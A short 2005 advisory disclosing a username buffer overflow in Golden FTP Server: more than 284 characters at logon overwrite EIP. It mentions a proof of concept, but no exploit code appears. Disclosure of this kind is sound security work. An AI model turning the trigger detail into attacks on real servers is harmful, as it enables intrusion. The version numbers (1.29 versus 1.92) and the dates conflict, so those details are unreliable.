Subject: Golden Ftp server 1.29 Username remote Buffer Overflow


Golden Ftp Server Username Remote Buffer Overflow 

Date:03/01/2005

Version: Golden Ftp Server 1.92 

(Until 01/03/2005 it can be downloaded from
http://www.goldenftpserver.com/golden-ftp-server.zip
SHA-1 Hash of the ZIP file: 9F98D73C46E0F17EF31096F9441B9A9E8ED40CF3 
)

Vendor Description:

Golden FTP Server is extremely easy to use personal FTP server for  
Windows and can be run by any person who has the most basic computer skills.

Flaw Description:

Golden FTP server suffers from a Buffer Overflow when more than 284
characters is entered in the Username field
at logon.

As EIP can be overwritten, it is possible to execute arbitrary code in
systems running this version of the daemon.

IÂ´m providing just a simple proof of concept for this flaw.
